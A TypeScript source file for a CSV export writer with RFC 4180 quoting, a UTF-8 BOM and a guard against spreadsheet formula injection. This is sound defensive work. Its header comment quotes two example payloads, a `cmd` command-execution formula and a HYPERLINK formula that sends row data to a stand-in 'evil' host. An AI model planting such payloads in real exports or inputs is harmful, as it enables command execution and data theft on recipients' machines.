// Batch 3 §8.10 — the CSV writer. PURE, so every rule below is a unit test.
//
// Not to be confused with packages/utils/src/csv.ts, which PARSES an inventory
// import. This writes an export, and the two have opposite threat models: a
// parser defends this product from a hostile file, a writer defends the
// RECIPIENT's spreadsheet from this product's data.
//
// RFC 4180, with the three details every real consumer needs:
//   - CRLF line endings, as the RFC specifies and as Excel expects;
//   - a UTF-8 byte-order mark, because without it Excel on Windows reads a
//     Bangla pharmacy name as mojibake — a file that is correct and unreadable
//     is the same thing as wrong;
//   - quoting only where it is needed, so a human reading the file in a text
//     editor can still see it.
//
// FORMULA INJECTION IS THE REAL RISK HERE. A cell beginning `=`, `+`, `-`, `@`,
// tab or carriage return is executed as a formula by Excel, LibreOffice and
// Google Sheets when the file is opened — `=cmd|' /c calc'!A1` is the canonical
// payload, and `=HYPERLINK("http://evil/"&A1)` exfiltrates the row it sits in.
// A pharmacy name is user-controlled text that reaches this writer, so the
// guard is not optional.
//
// THE PREFIX GOES INSIDE THE QUOTES. `"'=1+1"` is a text cell containing
// `'=1+1`; `'"=1+1"` is malformed and most parsers read it as a quoted field
// beginning with a stray apostrophe. Getting this backwards produces a file
// that looks defended and is not, which is why the test asserts the exact bytes.

/** The UTF-8 BOM, so Excel reads the file as UTF-8 rather than guessing. */
export const UTF8_BOM = '﻿';

/** RFC 4180's line terminator. */
export const CSV_LINE_ENDING = '\r\n';

/**
 * The characters that start a formula.
 *
 * `-` is included and that has a real cost: a legitimate negative number such
 * as `-150.00` is formula-shaped. It is still prefixed, and the test proves the
 * prefixed form stays readable as a number to a human and as TEXT to a
 * spreadsheet. A refund-net total can be negative — packages/utils/netSales.ts
 * allows it deliberately — so this case is not hypothetical.
 */
const FORMULA_STARTERS: readonly string[] = ['=', '+', '-', '@', '\t', '\r'];

function startsFormula(value: string): boolean {
  return value.length > 0 && FORMULA_STARTERS.includes(value.slice(0, 1));
}

/** Needs quoting under RFC 4180, plus the surrounding-space case Excel mangles. */
function needsQuoting(value: string): boolean {
  return /[",\r\n]/.test(value) || value !== value.trim();
}

/**
 * One field, escaped and neutralised.
 *
 * Order matters: the apostrophe is prepended FIRST, then the whole thing is
 * quoted, so the prefix ends up inside the quotes where a parser reads it as
 * part of the text.
 */
export function csvField(value: string): string {
  const neutralised = startsFormula(value) ? "'" + value : value;
  if (!needsQuoting(neutralised) && !startsFormula(value)) return neutralised;
  return '"' + neutralised.replaceAll('"', '""') + '"';
}

export function csvRow(fields: readonly string[]): string {
  return fields.map(csvField).join(',');
}

export interface CsvDocument {
  headers: readonly string[];
  rows: readonly (readonly string[])[];
  /**
   * Lines placed ABOVE the header row, each in the first column.
   *
   * ROUND 1B FINDING 6. The PDF carries the report's title and subtitle and
   * the CSV carried neither, so a downloaded file held a month and an empty
   * amount and nothing to say the amount was WITHHELD rather than zero. On
   * screen the subtitle and a tooltip say so; detached from the page, the file
   * said nothing at all.
   *
   * Padded to the header width rather than written as a short row, because
   * `parseCsv` refuses a file whose rows disagree on column count -- a
   * one-field preamble would have made this panel's own exports unreadable by
   * this panel's own parser.
   */
  notes?: readonly string[];
}

/**
 * The whole file: BOM, header row, data rows, CRLF throughout, trailing CRLF.
 *
 * A trailing terminator is what the RFC's grammar allows and what every parser
 * tolerates; omitting it makes the last row indistinguishable from a truncated
 * write.
 */
export function toCsv(document: CsvDocument): string {
  const width = document.headers.length;
  const notes = (document.notes ?? []).map((note) =>
    csvRow([note, ...Array.from({ length: Math.max(0, width - 1) }, () => '')]),
  );
  const lines = [...notes, csvRow(document.headers), ...document.rows.map(csvRow)];
  return UTF8_BOM + lines.join(CSV_LINE_ENDING) + CSV_LINE_ENDING;
}

/**
 * The content type to send it with.
 *
 * An explicit charset: a bare `text/csv` lets a browser guess, and the BOM only
 * helps a consumer that already decoded the stream as UTF-8.
 */
export const CSV_CONTENT_TYPE = 'text/csv; charset=utf-8';

/**
 * A `Content-Disposition` value whose filename cannot carry a path or a quote.
 *
 * The report id and the date come from a parsed schema, but this is the one
 * place such a value crosses into a header, and a header is parsed by software
 * this product does not control.
 */
export function contentDisposition(filename: string): string {
  const safe = filename.replace(/[^A-Za-z0-9._-]/g, '_').slice(0, 100);
  return 'attachment; filename="' + safe + '"';
}
